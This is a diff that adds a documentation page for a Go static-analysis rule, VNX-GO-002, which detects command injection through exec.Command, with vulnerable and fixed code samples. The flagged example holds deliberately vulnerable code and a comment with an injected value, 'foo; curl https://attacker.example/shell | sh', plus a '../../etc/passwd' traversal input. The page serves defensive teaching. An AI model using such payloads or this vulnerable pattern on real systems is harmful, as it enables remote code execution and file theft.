@@ -1,0 +1,118 @@
+---
+title: "VNX-GO-002: Command injection via exec.Command"
+nav: "VNX-GO-002"
+description: "Reports exec.Command/CommandContext running a shell with -c (or /C, -Command) and a script built with fmt.Sprintf or concatenation, or read from the HTTP request, and a program name that is itself formatted or request-supplied. Constant scripts, positional parameters, shell-quoted values and formatted arguments to a fixed program are not reported."
+order: 704
+sources: ["cli/internal/sast/rules/vnx-go-002.rego", "cli/website/content/docs/sast-rules/vnx-go-002.md"]
+checked: ["cli@4c8c3b7"]
+updated: "01 Nov 2026"
+generated: true
+---
+
+| Field | Value |
+|---|---|
+| Rule ID | `VNX-GO-002` |
+| Severity | High |
+| SARIF level | `error` |
+| Kind | `sast` |
+| Languages | Go |
+| CWE | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) |
+| CAPEC | [CAPEC-88](https://capec.mitre.org/data/definitions/88.html) |
+| ATT&CK | [T1059](https://attack.mitre.org/techniques/T1059/) |
+| CWSS vector | `CWSS:1.0/TI:H/AP:A/AL:A/IC:N/FC:LT/RP:N/RL:A/AV:I/AS:N/IN:A/SC:A/BI:H/DI:H/EX:H/EC:N/P:H` |
+| Tags | `command-injection` `dangerous-function` |
+| Source | [`internal/sast/rules/vnx-go-002.rego`](https://github.com/Vulnetix/cli/blob/main/internal/sast/rules/vnx-go-002.rego) |
+
+## Overview
+
+This rule detects `exec.Command` and `exec.CommandContext` calls (including `golang.org/x/sys/execabs` and import aliases) that hand a shell a script built from formatted, concatenated or request-supplied text. When any portion of the formatted string originates from user input, a query parameter, form field, environment variable, or file content, an attacker can inject arbitrary operating system commands. This vulnerability is classified as [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html).
+
+> **Go idiom note:** Passing arguments as separate parameters to `exec.Command` IS the idiomatic Go default. The `os/exec` package was designed to avoid shell invocation entirely, using `fmt.Sprintf` to construct a combined command string is an anti-pattern that goes against the package's design. The secure approach is also the natural one.
+
+## Why This Matters
+
+OS command injection gives an attacker direct access to the host operating system under the same privileges as the running process. In a cloud or container environment that typically means the ability to read secrets from environment variables or mounted volumes, exfiltrate data, install backdoors, move laterally to other services on the same network, or destroy data. Unlike SQL injection, which is constrained to the database, command injection exposes the entire host. The risk is amplified in Go services that accept external input (web handlers, gRPC services, CLIs) because Go programs often run with elevated container or system privileges.
+
+OWASP ASVS v4.0 requirement **V5.2.2** requires that unstructured data be sanitized to enforce safety measures such as allowed characters and length. For OS command construction, the only reliable enforcement is to never construct a shell string at all.
+
+## What Gets Flagged
+
+The rule fires when `exec.Command` or `exec.CommandContext` starts a shell (`sh`, `bash`, `zsh`, `cmd`, `powershell`, `pwsh`...) with `-c`, `/C` or `-Command` and the script is built with `fmt.Sprintf` or `+`, read from the request, or held in a variable assigned from one of those a few lines up. A call broken over several lines is read as one. It also fires when the program name itself is formatted or request-supplied. A formatted value passed as its own argument to a fixed program (`exec.Command("git", "log", fmt.Sprintf(...))`) is not reported: no shell parses it. Nor is a value passed as a positional parameter (`sh -c 'grep "$1" f' sh value`) or quoted with `shellescape.Quote`. A script whose only formatted pieces are integers (`fmt.Sprintf("kill -0 %d", pid)`, `strconv.Itoa`) is not reported either: an integer cannot carry shell syntax.
+
+```go
+// FLAGGED: concatenated script
+cmd := exec.Command("sh", "-c", "ping -c 2 "+endpoint)
+```
+
+```go
+// FLAGGED: user input folded into a shell command via fmt.Sprintf
+func runReport(w http.ResponseWriter, r *http.Request) {
+    name := r.FormValue("filename")
+    cmd := exec.Command("sh", "-c", fmt.Sprintf("cat /reports/%s", name))
+    out, _ := cmd.Output()
+    w.Write(out)
+}
+// An attacker passes filename=../../etc/passwd or
+// filename=foo; curl https://attacker.example/shell | sh
+```
+
+## Remediation
+
+1. **Pass arguments as separate parameters to `exec.Command`.** Go's `exec.Command` deliberately separates the executable from its arguments. This completely prevents shell interpretation, no shell is invoked, so metacharacters like `;`, `|`, `&&`, `$()` are treated as literals.
+
+```go
+// SAFE: arguments are separate; no shell interpolation occurs
+func runReport(w http.ResponseWriter, r *http.Request) {
+    name := r.FormValue("filename")
+    cmd := exec.Command("cat", "/reports/"+name)
+    out, err := cmd.Output()
+    if err != nil {
+        http.Error(w, "report unavailable", http.StatusInternalServerError)
+        return
+    }
+    w.Write(out)
+}
+```
+
+2. **Validate input against an allowlist before use.** Even with separate arguments, a path traversal attack is still possible (`../../etc/passwd`). Validate the filename against an allowlist of permitted values, or use `filepath.Clean` combined with a base directory check.
+
+```go
+import (
+    "path/filepath"
+    "strings"
+)
+
+func safeReportPath(name string) (string, error) {
+    base := "/reports"
+    clean := filepath.Clean(filepath.Join(base, name))
+    if !strings.HasPrefix(clean, base+string(filepath.Separator)) {
+        return "", fmt.Errorf("invalid report name")
+    }
+    return clean, nil
+}
+```
+
+3. **Avoid `sh -c` entirely.** Never pass a dynamically constructed string to a shell (`sh -c`, `bash -c`, `cmd /C`). If you need shell features like pipes, implement them natively in Go using `io.Pipe` and multiple `exec.Command` calls connected together.
+
+4. **Consider `exec.LookPath` for explicit binary resolution.** When the executable itself could be influenced by input, use `exec.LookPath` to resolve the binary to an absolute path before executing it.
+
+## References
+
+- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
+- [OWASP Application Security Verification Standard v4.0 – V5.2 Sanitization and Sandboxing](https://owasp.org/www-project-application-security-verification-standard/)
+- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
+- [OWASP Go Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Go_Security_Cheat_Sheet.html)
+- [Go os/exec package documentation](https://pkg.go.dev/os/exec)
+- [CAPEC-88: OS Command Injection](https://capec.mitre.org/data/definitions/88.html)
+- [MITRE ATT&CK T1059 – Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
+
+## Suppressing this rule
+
+Put a `nosec` comment on the line, or on line 1 to cover the whole file. Use the comment marker of the file's language (`#`, `//`, `--` or `;`):
+
+```text
+# nosec vnx-go-002
+// nosec vnx-go-002
+```
+
+Or record an ignore rule: `vulnetix ignore add --rule vnx-go-002 --reason "..."`. See [Suppressing findings](/sast/guides/suppressing-findings/).
